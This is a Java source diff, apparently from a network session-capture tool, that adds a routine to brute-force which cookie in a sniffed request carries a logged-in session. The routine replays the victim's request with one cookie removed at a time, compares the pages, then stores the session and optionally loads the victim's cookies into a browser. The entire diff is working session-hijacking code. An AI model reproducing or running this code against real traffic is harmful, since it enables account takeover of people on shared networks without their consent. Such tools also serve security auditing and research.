@@ -13,7 +13,9 @@ import java.net.URLConnection;
 import java.sql.SQLException;
 import java.text.DateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
+import java.util.List;
 
 import javax.script.Invocable;
 import javax.script.ScriptEngine;
@@ -381,7 +383,6 @@ public class CaptureHandler
 				requestHost.isEmpty() ||
 				requestUri.isEmpty() ||
 				accept.isEmpty() ||
-				cookieData.isEmpty() ||
 				requestUri.contains("favicon."))
 			return;
 
@@ -393,7 +394,7 @@ public class CaptureHandler
         		// And yes, this means that we can't pick up multiple logins to the same site from the
         		// same client. And while this is sad, there's not really a better way...
         		String uniqueID = macAddress + "," + requestHost;
-				
+
 				// Now check for the token. If new, pass on to handler classes
 				try
 				{	
@@ -405,6 +406,7 @@ public class CaptureHandler
 						ScriptEngineManager manager = new ScriptEngineManager();
 					    ScriptEngine engine = manager.getEngineByName("js");
 						
+					    boolean bFoundMatch = false;
 						for(String sd : sessionDetectors)
 						{
 					    	FileReader reader = new FileReader(sd);
@@ -469,8 +471,85 @@ public class CaptureHandler
 					    		
 					    		// A match has been made against this request. Exit to prevent other
 					    		// detectors from needlessly using system resources.
+				    			bFoundMatch = true;
 					    		break;
 					    	}
+						}
+
+						if(!bFoundMatch && accept.contains("text/html"))
+						{
+							// Nothing found, so we'll try to bruteforce by
+							// cookie manipulation
+							
+							//String comparePageContent = null;
+							// Get the "stock" page content
+							String stockPageContent = Utils.readUrl("http://" + requestHost + requestUri, userAgent, accept, cookieData);
+
+							List<String> cookieList = Arrays.asList(cookieData.split(";"));
+							
+							// Now we iterate through all cookies, eliminating each
+							for(String cookie : cookieList)
+							{
+								if(cookie.startsWith("_ut")) // Ignore Google Analytics cookies
+									continue;
+								
+								// Reconstruct cookie string
+								StringBuilder replacementCookieStringBuilder = new StringBuilder();
+								String loopDelim = "";
+								for(String s : cookieList)
+								{
+									if(s.equals(cookie) || s.trim().isEmpty()) // Remove the cookie we're testing
+									{
+										Utils.consoleMessage("Removing " + cookie.split("=")[0]);
+										continue;
+									}
+									
+									replacementCookieStringBuilder.append(loopDelim);
+									replacementCookieStringBuilder.append(s);
+
+							        loopDelim = ";";
+							    }
+								String replacementCookieData = replacementCookieStringBuilder.toString().trim();
+								
+Utils.consoleMessage(requestHost + ": " + replacementCookieData);
+								
+								// Using this new cookie list, query the endpoint
+								String comparePageContent = Utils.readUrl("http://" + requestHost + requestUri, userAgent, accept, replacementCookieData);
+								
+								// Lev distance is rather intensive, so only try =< 10,000 chars
+								int maxLength = 10000;
+								if(Math.min(stockPageContent.length(), comparePageContent.length()) < maxLength)
+									maxLength = Math.min(stockPageContent.length(), comparePageContent.length());
+								
+								// Determine the distance
+								int levNum = Utils.computeLevenshteinDistance(stockPageContent.substring(0,maxLength), comparePageContent.substring(0,maxLength));
+								double percentChange = (double)levNum / (double)maxLength;
+								
+Utils.consoleMessage(requestHost + " - " + cookie.split("=")[0] + ": " + percentChange);
+
+								// If the amount of change on the page was >= 5%,  then the page changed
+								// a good amount as we tried removing each request cookie.
+								// That's a pretty good indication of a logged-in user.
+								if(percentChange >= 0.05)
+								{
+									// It takes quite some time to get here, so double-check we're still unique.
+									// If we're not unique anymore, just exit.
+									if(Utils.dbInstance.containsValue("sessions", "user_token", uniqueID))
+										continue;
+									
+					    			handleSession(requestID, uniqueID, "<html>User session on<br><font size=5>" + requestHost + "</font><br>Session Cookie Name: " + cookie.split("=")[0], null, requestUri);
+
+					    			if(Utils.cookieCadgerFrame != null)
+					    			{
+						    			// Session created, check to see if we should auto-load it as well.
+						    			if(((JCheckBox)Utils.cookieCadgerFrame.getComponentByName("chckbxAutomaticallyLoadSessions")).isSelected())
+						    			{						    							
+						    				BrowserHandler.loadRequestIntoBrowser(requestHost, requestUri, userAgent, refererUri, cookieData, authorization);
+						    			}
+					    			}									
+									break;
+								}
+							}
 						}
 					}
 				} catch (Exception e1)
